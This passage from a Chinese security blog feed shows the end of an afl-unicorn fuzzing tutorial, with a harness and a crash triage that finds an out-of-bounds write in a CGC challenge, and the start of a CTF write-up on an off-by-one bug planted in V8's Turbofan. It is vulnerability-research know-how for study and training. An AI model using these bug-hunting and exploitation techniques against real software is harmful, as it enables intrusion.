crash).</span></span><br><span class="line">        print(<span class="string">"Execution failed with error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        uc.dump_regs() </span><br><span class="line">        uc.force_crash(e)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Final register state:"</span>)    </span><br><span class="line">    uc.dump_regs()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done."</span>)    </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>整体浏览一下，TODO的地方不多，加载context之类的工作，比如之前我们学习unicorn时候要做的很多分配栈地址之类的，都已经在unicorn_loader里给通过load我们之前dump出的context来自动完成了，简单快捷。</p><p>那么把每处TODO大概看看</p><ol><li>TODO: Apply constraints to mutated input here<br>我感觉没必要额外加什么约束，直接注释掉raise。</li><li>TODO: Set the input into the state so it will be handled<br>我们要fuzz的函数的参数此时都存在寄存器里，所以直接改掉寄存器的值就好。</li><li>TODO: Set start/end address here<br>这个就是我们刚刚断下来的地址就是起始地址，要fuzz的函数结束的地方就是终止地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-124208.png" alt=""></li><li>TODO: Setup hooks and handle anything you need to here<br>最麻烦的地方，和之前学习unicorn一样，有些指令还是要单独hook的。<br>另外就是之前说的，这个函数要先检查crc校验和，这个参数我们没做控制，直接把那个检查hook了然后跳过。</li></ol><p>hook crc校验和<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-125011.png" alt=""></p><p>hook malloc，好处是我们可以自己实现自己的Guard Page，从而在越界读写的时候立刻crash。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-130132.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-125907.jpg" alt=""></p><p>hook free<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-130219.png" alt=""></p><p>hook printf<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-130256.png" alt=""></p><p>hook cgc_transmit<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-132201.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *  <span class="comment"># <span class="doctag">TODO:</span> Set correct architecture here as necessary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> unicorn_loader </span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple stand-in heap to prevent OS/kernel issues</span></span><br><span class="line">unicorn_heap = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start and end address of emulation</span></span><br><span class="line">START_ADDRESS = <span class="number">0x0804D106</span> <span class="comment"># <span class="doctag">TODO:</span> Set start address here</span></span><br><span class="line">END_ADDRESS   = <span class="number">0x0804D120</span> <span class="comment"># <span class="doctag">TODO:</span> Set end address here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Address where checksum is checked and where it goes if it is valid</span></span><br><span class="line">CHKSUM_CMP_ADDR    = <span class="number">0x0804DA45</span></span><br><span class="line">CHKSUM_PASSED_ADDR = <span class="number">0x0804DA52</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Entry points of addresses of functions to hook</span></span><br><span class="line">MALLOC_ENTRY        = <span class="number">0x08049C40</span></span><br><span class="line">FREE_ENTRY          = <span class="number">0x08049980</span></span><br><span class="line">PRINTF_ENTRY        = <span class="number">0x0804AA60</span></span><br><span class="line">CGC_TRANSMIT_ENTRY  = <span class="number">0x0804A4C2</span></span><br><span class="line">CGC_TRANSMIT_PASSED = <span class="number">0x0804A4DC</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Implement target-specific hooks in here.</span></span><br><span class="line"><span class="string">    Stub out, skip past, and re-implement necessary functionality as appropriate</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_hook_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == MALLOC_ENTRY:</span><br><span class="line">        print(<span class="string">"--- Rerouting call to malloc() @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        size = struct.unpack(<span class="string">"&lt;I"</span>, uc.mem_read(uc.reg_read(UC_X86_REG_ESP) + <span class="number">4</span>, <span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">        retval = unicorn_heap.malloc(size)</span><br><span class="line">        uc.reg_write(UC_X86_REG_EAX, retval)</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, struct.unpack(<span class="string">"&lt;I"</span>, uc.mem_read(uc.reg_read(UC_X86_REG_ESP), <span class="number">4</span>))[<span class="number">0</span>])</span><br><span class="line">        uc.reg_write(UC_X86_REG_ESP, uc.reg_read(UC_X86_REG_ESP) + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass these functions by jumping straight out of them - We can't (or don't want to) emulate them</span></span><br><span class="line">    <span class="keyword">elif</span> address == FREE_ENTRY <span class="keyword">or</span> address == PRINTF_ENTRY:</span><br><span class="line">        print(<span class="string">"--- Bypassing a function call that we don't want to emulate @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, struct.unpack(<span class="string">"&lt;I"</span>, uc.mem_read(uc.reg_read(UC_X86_REG_ESP), <span class="number">4</span>))[<span class="number">0</span>])</span><br><span class="line">        uc.reg_write(UC_X86_REG_ESP, uc.reg_read(UC_X86_REG_ESP) + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass the checksum check</span></span><br><span class="line">    <span class="keyword">elif</span> address == CHKSUM_CMP_ADDR:</span><br><span class="line">        print(<span class="string">"--- Bypassing checksum validation @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, CHKSUM_PASSED_ADDR)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Bypass the CGC_TRANSMIT_ENTRY check</span></span><br><span class="line">    <span class="keyword">elif</span> address == CGC_TRANSMIT_ENTRY:</span><br><span class="line">        print(<span class="string">"--- Bypassing CGC_TRANSMIT_ENTRY validation @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, CGC_TRANSMIT_PASSED)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> address == START_ADDRESS:</span><br><span class="line">        print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">        print(mu.mem_read(address,size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> Setup hooks and handle anything you need to here</span></span><br><span class="line">    <span class="comment">#    - For example, hook malloc/free/etc. and handle it internally</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------</span></span><br><span class="line"><span class="comment">#---- Main test function  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'context_dir'</span>, type=str, help=<span class="string">"Directory containing process context"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, type=str, help=<span class="string">"Path to the file containing the mutated input content"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, default=<span class="literal">False</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"Dump trace info"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Loading context from &#123;&#125;"</span>.format(args.context_dir))</span><br><span class="line">    uc = unicorn_loader.AflUnicornEngine(args.context_dir, enable_trace=args.debug, debug_print=<span class="literal">False</span>)       </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Instantiate the hook function to avoid emulation errors</span></span><br><span class="line">    <span class="keyword">global</span> unicorn_heap</span><br><span class="line">    unicorn_heap = unicorn_loader.UnicornSimpleHeap(uc, debug_print=<span class="literal">True</span>)</span><br><span class="line">    uc.hook_add(UC_HOOK_CODE, unicorn_hook_instruction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute 1 instruction just to startup the forkserver</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> This instruction will be executed again later, so be sure that</span></span><br><span class="line">    <span class="comment">#       there are no negative consequences to the overall execution state.</span></span><br><span class="line">    <span class="comment">#       If there are, change the later call to emu_start to no re-execute </span></span><br><span class="line">    <span class="comment">#       the first instruction.</span></span><br><span class="line">    print(<span class="string">"Starting the forkserver by executing 1 instruction"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.emu_start(START_ADDRESS, <span class="number">0</span>, <span class="number">0</span>, count=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: Failed to execute a single instruction (error: &#123;&#125;)!"</span>.format(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Allocate a buffer and load a mutated input and put it into the right spot</span></span><br><span class="line">    <span class="keyword">if</span> args.input_file:</span><br><span class="line">        print(<span class="string">"Loading input content from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">        input_file = open(args.input_file, <span class="string">'rb'</span>)</span><br><span class="line">        input_content = input_file.read()</span><br><span class="line">        input_file.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Apply constraints to mutated input here</span></span><br><span class="line">        <span class="keyword">if</span> len(input_content) &gt; <span class="number">0xFF</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># raise exceptions.NotImplementedError('No constraints on the mutated inputs have been set!')</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Allocate a new buffer and put the input into it</span></span><br><span class="line">        buf_addr = unicorn_heap.malloc(len(input_content))</span><br><span class="line">        uc.mem_write(buf_addr, input_content)</span><br><span class="line">        print(<span class="string">"Allocated mutated input buffer @ 0x&#123;0:016x&#125;"</span>.format(buf_addr))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Set the input into the state so it will be handled</span></span><br><span class="line">        <span class="comment">#raise exceptions.NotImplementedError('The mutated input was not loaded into the Unicorn state!')</span></span><br><span class="line">        uc.reg_write(UC_X86_REG_EAX, buf_addr)</span><br><span class="line">        uc.reg_write(UC_X86_REG_DL, len(input_content))</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Run the test</span></span><br><span class="line">    print(<span class="string">"Executing from 0x&#123;0:016x&#125; to 0x&#123;1:016x&#125;"</span>.format(START_ADDRESS, END_ADDRESS))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = uc.emu_start(START_ADDRESS, END_ADDRESS, timeout=<span class="number">0</span>, count=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># If something went wrong during emulation a signal is raised to force this </span></span><br><span class="line">        <span class="comment"># script to crash in a way that AFL can detect ('uc.force_crash()' should be</span></span><br><span class="line">        <span class="comment"># called for any condition that you want AFL to treat as a crash).</span></span><br><span class="line">        print(<span class="string">"Execution failed with error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        uc.dump_regs() </span><br><span class="line">        uc.force_crash(e)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Final register state:"</span>)    </span><br><span class="line">    uc.dump_regs()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done."</span>)    </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>运行fuzz<br>需要唯一些输入进去。<br>那就random一些就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        size = random.randint(<span class="number">20</span>, <span class="number">50</span>)</span><br><span class="line">        os.system(<span class="string">f'dd if=/dev/urandom of=testcase/testcase_<span class="subst">&#123;i&#125;</span> count=2 bs=<span class="subst">&#123;size&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;afl-unicorn&#x2F;afl-fuzz -U -m none -i &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;testcase&#x2F; -o &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;fuzz_out&#x2F; -- python harness.py &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;UnicornContext_20200405_045024&#x2F; @@</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-012549.png" alt=""><br>crash很多，跑了大概几秒钟，大概打开看看，定位一下漏洞点。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-013757.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-013900.png" alt=""><br>但问题来了，没有栈回溯，我怎么定位到漏洞点。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-014953.png" alt=""></p><p>我简单的排查了一下，因为这道题的代码量并不大，尤其是我hook的代码并不多，所以我可以trace每条指令，和执行时它的一些关键信息。<br>而这里比较简单的就是我review了一下memcpy的交叉引用，然后在new_packet里面找到了我要的。<br>因为我是打印了执行流的，我看了一下地址<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015510.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015151.png" alt=""><br>在我检索之后发现log里有call cgc_memcpy，并且里没有trace到它的下一条指令0x000000000804db8e<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015604.png" alt=""><br>到这里基本上就可以知道漏洞点了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015730.png" alt=""><br>简单的思考一下，pNewPacket的buf大小是0x40，也就是64字节。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015909.png" alt=""><br>但是很显然，在cgc_receive_packet里是根本没有对其进行dataLen的校验的。换而言之，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-020057.png" alt=""><br>这里cgc_g_packetHandlers是一个全局变量，用处大概是填充诸多类型的packetType用来进行check。<br>而只需要在pData第一个字节构造好type类型，就可以进入add_new_packet函数里，并造成一个oob write了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>afl-unicorn的局限性在于，它和unicorn一样，在你模拟执行的时候，必须hook一些函数来让它正常运行，为了尽可能简单的来模拟环境，你可能还需要去运行固件并dump内存上下文，这有时是困难的，起码我在刚开始研究afl-unicorn时候的初衷是因为我有一些东西不能直接跑起来。<br>此外在trace crash路径的时候，虽然我是逐指令hook的，但是事实上这样在遇到一些循环之类的时候会造成log爆炸的增长，我相信你不会想看到这种东西的。<br>所以还需要根据实际情况去hook需要hook的代码。<br>我已经很久没做任何逆向了，不过我有很多感兴趣的目标，我需要掌握的更多。</p><p>后续我可能还会再更新一篇关于afl-unicorn源码的笔记，不过可能会比较简单，因为我不是那种非常注意细节的人，我只关心我应该怎么改才能让我的工作跑起来。</p><p>这个系列不出意外我会长期更新，并会在适当的时候写一些我曾经使用过的，挖掘到了高质量浏览器漏洞的fuzz的内容，事实上都非常简单和有趣。</p><p>所有的代码可以在<a href="https://github.com/eternalsakura/sakura_all_fuzz" target="_blank" rel="noopener">这里</a>找到。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">http://eternal.red/2018/unicorn-engine-tutorial/</a></p><p><a href="https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5" target="_blank" rel="noopener">https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sakuraのall-fuzz-afl-unicorn&quot;&gt;&lt;a href=&quot;#sakuraのall-fuzz-afl-unicorn&quot; class=&quot;headerlink&quot; title=&quot;sakuraのall fuzz:afl-unicorn&quot;&gt;&lt;/a&gt;sakur
      
    
    </summary>
    
    
      <category term="Fuzz" scheme="http://eternalsakura13.com/categories/Fuzz/"/>
    
    
      <category term="fuzz" scheme="http://eternalsakura13.com/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>qwb growupjs &amp; wctf independence_day writeup</title>
    <link href="http://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/"/>
    <id>http://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/</id>
    <published>2019-07-16T10:23:12.934Z</published>
    <updated>2019-07-17T08:08:25.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qwb-growupjs-amp-wctf-independence-day-writeup"><a href="#qwb-growupjs-amp-wctf-independence-day-writeup" class="headerlink" title="qwb growupjs &amp; wctf independence_day writeup"></a>qwb growupjs &amp; wctf independence_day writeup</h1><h2 id="qwb-growupjs"><a href="#qwb-growupjs" class="headerlink" title="qwb growupjs"></a>qwb growupjs</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc b&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc</span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  &#x2F;&#x2F; M &lt; x &#x3D;&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          &#x2F;&#x2F; x &lt; 0 &#x3D;&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    &#x2F;&#x2F; K &lt; K &#x3D;&gt; K</span><br><span class="line">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span><br><span class="line">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  &#x2F;&#x2F; x &lt; x &#x3D;&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure><p>patch如上，实际上是在MachineOperatorReducer的这个case中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kUint32LessThan: &#123;</span><br><span class="line">      <span class="function">Uint32BinopMatcher <span class="title">m</span><span class="params">(node)</span></span>;</span><br><span class="line">      <span class="keyword">if</span> (m.left().Is(kMaxUInt32)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// M &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.right().Is(<span class="number">0</span>)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);          <span class="comment">// x &lt; 0 =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.IsFoldable()) &#123;                                    <span class="comment">// K &lt; K =&gt; K</span></span><br><span class="line">        <span class="keyword">return</span> ReplaceBool(m.left().Value() &lt; m.right().Value()+<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (m.LeftEqualsRight()) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// x &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br><span class="line">        <span class="function">Int32BinopMatcher <span class="title">mleft</span><span class="params">(m.left().node())</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (mleft.right().HasValue()) &#123;</span><br><span class="line">          <span class="comment">// (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K)</span></span><br><span class="line">          <span class="comment">// when C &lt; (M &gt;&gt; K)</span></span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> c = m.right().Value();</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> k = mleft.right().Value() &amp; <span class="number">0x1F</span>;</span><br><span class="line">          <span class="keyword">if</span> (c &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(kMaxInt &gt;&gt; k)) &#123;</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">0</span>, mleft.left().node());</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">1</span>, Uint32Constant(c &lt;&lt; k));</span><br><span class="line">            <span class="keyword">return</span> Changed(node);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// TODO(turbofan): else the comparison is always true.</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先这个patch很简单，就是本来如果是1&lt;1这样的kUint32LessThan比较，应该替换成false节点，而这里变成1&lt;2（<code>m.right().Value()+1)</code>），于是就替换成了true节点。<br>这个bug非常明显，但是如何利用呢？实际上对array边界的检查可以lower到Uint32LessThan节点，所以这实际上可以转化成一个array的off-by-one漏洞。<br>然后后续利用和<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a>中使用的方法一致。</p><h3 id="IR分析"><a href="#IR分析" class="headerlink" title="IR分析"></a>IR分析</h3><p>我做了几组case，先看一个比较简单的case</p><h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1"></a>case 1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    let arr &#x3D; [1.1, 2.2, 3.3, 4.4];</span><br><span class="line">    let idx &#x3D; 3;</span><br><span class="line">    return arr[idx];</span><br><span class="line">&#125;</span><br><span class="line">for (i &#x3D; 0; i &lt; 10000; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typer phase<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104131.png" alt=""><br>在取arr[idx]之前会进行CheckBounds，然后在Simplified lower之后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 